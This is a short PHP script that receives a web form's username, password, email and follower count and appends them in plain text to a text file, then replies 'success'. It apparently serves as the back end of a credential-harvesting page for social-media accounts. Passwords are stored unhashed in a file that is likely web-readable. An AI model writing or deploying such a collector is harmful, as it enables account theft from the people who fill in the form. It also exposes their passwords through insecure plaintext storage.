<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $email = htmlspecialchars($_POST['email']);
    $followers = htmlspecialchars($_POST['followers']);

    // Prepare data to write
    $data = "Username: $username\nPassword: $password\nEmail: $email\nFollowers: $followers\n\n";

    // Specify the file to write to
    $file = 'form_submissions.txt';

    // Write data to the file
    file_put_contents($file, $data, FILE_APPEND);

    // Redirect or return a response
    echo 'success';
}
?>